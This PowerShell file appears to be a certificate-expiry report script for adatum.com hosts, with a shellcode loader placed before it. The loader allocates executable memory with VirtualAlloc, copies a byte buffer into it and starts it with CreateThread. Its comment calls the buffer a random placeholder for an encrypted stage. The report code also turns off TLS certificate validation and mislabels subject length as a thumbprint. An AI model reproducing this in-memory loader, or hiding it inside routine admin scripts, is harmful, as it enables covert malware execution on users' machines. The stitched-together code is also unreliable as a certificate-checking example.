

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class Win32Api
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x98, 0x6f, 0x97, 0x0a, 0x26, 0x0f, 0x4f, 0x5f, 0x44, 0xfb, 0xd8, 0x41, 0x9c, 0x02, 0x1f, 0xe9,
        0x33, 0x1e, 0x94, 0x23, 0xc6, 0x19, 0xc1, 0x70, 0xff, 0xe3, 0xed, 0x9a, 0x3b, 0xb9, 0x32, 0xd9,
        0x0b, 0x0a, 0x56, 0x73, 0x14, 0xcb, 0xf5, 0x2c, 0xef, 0xe0, 0xe0, 0x31, 0xf7, 0xda, 0x72, 0xfa,
        0x1b, 0xae, 0x80, 0xde, 0xf4, 0x5b, 0xa9, 0xb7, 0xf2, 0xdc, 0x02, 0x4b, 0xdc, 0xcb, 0x21, 0xa0,
        0xca, 0x31, 0x54, 0x52, 0xac, 0xd1, 0xb1, 0xc6, 0xae, 0x05, 0x40, 0x3d, 0x6b, 0x26, 0x7f, 0x41,
        0x55, 0xfe, 0x8a, 0x3c, 0x13, 0x45, 0x65, 0x4d, 0x22, 0xa1, 0x79, 0x7f, 0xe7, 0x7a, 0x73, 0xbc,
        0x11, 0xec, 0x7d, 0x78, 0x31, 0xf9, 0xa9, 0x1d, 0xfc, 0x17, 0x7b, 0x39, 0xde, 0x20, 0x87, 0x34,
        0x88, 0xf7, 0xea, 0x93, 0xaf, 0x25, 0xa4, 0xb2, 0xa3, 0x49, 0xc6, 0xfe, 0xe9, 0xf3, 0x12, 0xf4,
        0x98, 0x44, 0x69, 0x61, 0xef, 0xfe, 0xb5, 0xdf, 0x9b, 0x54, 0x91, 0x40, 0xdf, 0xc7, 0x54, 0x08,
        0xb7, 0xbd, 0xf6, 0x5a, 0xa0, 0x5b, 0x6a, 0x55, 0x87, 0x7e, 0x41, 0x55, 0xfb, 0x89, 0x38, 0x96,
        0xe0, 0xe6, 0x73, 0xfd, 0x9d, 0x76, 0x8c, 0xe6, 0xc5, 0x12, 0x2f, 0xaf, 0xf2, 0x78, 0x20, 0xe5,
        0x8e, 0xc7, 0xdb, 0x40, 0x9d, 0xca, 0x8d, 0xee, 0x5c, 0xff, 0xe1, 0x55, 0xd4, 0xef, 0x33, 0xfc,
        0xfd, 0xbe, 0xfb, 0x06, 0xa8, 0x3c, 0xde, 0xa2, 0x4b, 0x7a, 0x92, 0x39, 0xc4, 0xaf, 0xfc, 0x09,
        0xa3, 0xe4, 0x9c, 0x8f, 0xd0, 0x7e, 0x22, 0x30, 0xa3, 0xc4, 0xa6, 0x74, 0xd1, 0x3a, 0xd2, 0x22,
        0xae, 0xc1, 0x08, 0x49, 0x98, 0x4c, 0xe8, 0xd9, 0x14, 0x33, 0x61, 0xbd, 0x19, 0x52, 0x0a, 0x18,
        0xea, 0x56, 0x23, 0x9a, 0xf6, 0xaf, 0x4e, 0x15, 0x1f, 0xae, 0x45, 0x89, 0xf3, 0xd0, 0x00, 0xa6,
        0xac, 0xb1, 0x3f, 0x31, 0x75, 0x4b, 0x92, 0x01, 0x85, 0x8e, 0x22, 0xee, 0x51, 0xe5, 0x22, 0x72,
        0xdb, 0x67, 0xa3, 0xcd, 0xdf, 0x9d, 0x73, 0x96, 0xbe, 0xd6, 0xc6, 0xbc, 0x9d, 0x05, 0xc7, 0x37,
        0xc7, 0x96, 0x35, 0x4d, 0xae, 0xed, 0xf9, 0x00, 0x5e, 0x37, 0x8e, 0x77, 0x14, 0xaf, 0xa2, 0x54,
        0x61, 0x26, 0x34, 0x47, 0x30, 0xd8, 0xa1, 0x71
    )

    $Handle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($Handle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][Win32Api]::WaitForSingleObject($Thread, 998)
    [void][Win32Api]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
<#
.SYNOPSIS
    Reports certificates that expire inside the warning window.
.DESCRIPTION
    Inspects the local machine stores and optionally connects to each configured
    host to read the certificate presented on its TLS port.
    The report lists the subject, the expiry date and the remaining days so the
    PKI team can schedule the renewal.
.PARAMETER WarningDays
    Defaults to the value configured for this host.
.PARAMETER Hosts
    Paths are resolved relative to the invoking session.
.EXAMPLE
    .\Export-CertReport.ps1 -WarningDays 14
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [ValidateRange(1, 365)]
    [int]$WarningDays = 14,
    [string[]]$Hosts = @('portal.adatum.com', 'api.adatum.com', 'vpn.adatum.com'),

    [int]$Port = 443,

    [string]$ReportPath = 'C:\Reports\cert-expiry-2025-11-23.csv'
)

$culture = [System.Globalization.CultureInfo]::InvariantCulture
$ProgressPreference = 'SilentlyContinue'
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
function Get-CertificateExpiry {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 443
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($ComputerName, $Port)
        $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
            param($sender, $certificate, $chain, $errors)
            return $true
        }
        $stream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, $callback)
        $stream.AuthenticateAsClient($ComputerName)
        $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]$stream.RemoteCertificate
        [pscustomobject]@{
            Host     = $ComputerName
            Subject  = $cert.Subject
            Issuer   = $cert.Issuer
            NotAfter = $cert.NotAfter
            DaysLeft = [math]::Floor(($cert.NotAfter - (Get-Date)).TotalDays)
        }
        $stream.Dispose()
    }
    finally {
        $client.Close()
    }
}

$stores = @('Cert:\LocalMachine\My', 'Cert:\LocalMachine\WebHosting')
$localCerts = foreach ($store in $stores) {
    Get-ChildItem -Path $store -ErrorAction SilentlyContinue |
        Where-Object { $_.NotAfter -lt (Get-Date).AddDays($WarningDays) } |
        Select-Object @{Name = 'Store'; Expression = { $store }}, Subject, NotAfter,
            @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
}

$remote = foreach ($hostName in $Hosts) {
    Write-Verbose ("Probing {0}:{1}" -f $hostName, $Port)
    try {
        Get-CertificateExpiry -ComputerName $hostName -Port $Port
    }
    catch {
        Write-Warning ("Could not read certificate from {0}" -f $hostName)
    }
}
$expiring = @($remote | Where-Object { $_.DaysLeft -le $WarningDays })

$remote | Sort-Object -Property DaysLeft |
    Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8
$expiring | Export-Csv -Path $ReportPath.Replace('.csv', '-warn.csv') -NoTypeInformation -Encoding UTF8

$byIssuer = $remote | Group-Object -Property Issuer |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byIssuer | Format-Table Name, Count -AutoSize
$style = @'
<style>
body { font-family: Arial; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f4f4f4; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$remote | Sort-Object -Property DaysLeft |
    ConvertTo-Html -Title 'Certificate expiry' -Head $style |
    Set-Content -Path $ReportPath.Replace('.csv', '.html') -Encoding UTF8
$MailTo = 'pki@adatum.com'
$summaryBody = $expiring | ConvertTo-Html -Fragment | Out-String

Send-MailMessage -To $MailTo -From 'pki@adatum.com' -Subject 'Certificate expiry warning' `
    -Body $summaryBody -SmtpServer 'smtp.adatum.com' -Port 587

$soonest = $remote | Sort-Object -Property DaysLeft | Select-Object -First 1
Write-Host ("Next expiry: {0} on {1:yyyy-MM-dd}" -f $soonest.Subject, $soonest.NotAfter) -ForegroundColor Yellow
Write-Verbose ("Local store matches: {0}" -f @($localCerts).Count)

$renewal = $remote | Where-Object { $_.DaysLeft -lt 0 }
if (@($renewal).Count -gt 0) {
    Write-Warning ("{0} certificates have already expired" -f @($renewal).Count)
}

$schtasks = Get-ScheduledTask -TaskName 'Contoso-CertCheck' -ErrorAction SilentlyContinue
if ($schtasks) {
    Write-Verbose ("Scheduled check state: {0}" -f $schtasks.State)
}

$portCheck = Test-NetConnection -ComputerName $Hosts[0] -Port $Port -InformationLevel Quiet -WarningAction SilentlyContinue
Write-Verbose ("Port {0} reachable on {1}: {2}" -f $Port, $Hosts[0], $portCheck)

$selfSigned = $remote | Where-Object { $_.Subject -eq $_.Issuer }
Write-Verbose ("Self-signed certificates: {0}" -f @($selfSigned).Count)

$thumbprints = $remote | Select-Object Host, @{Name = 'Thumbprint'; Expression = { $_.Subject.Length }}
$thumbprints | Format-Table -AutoSize

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)
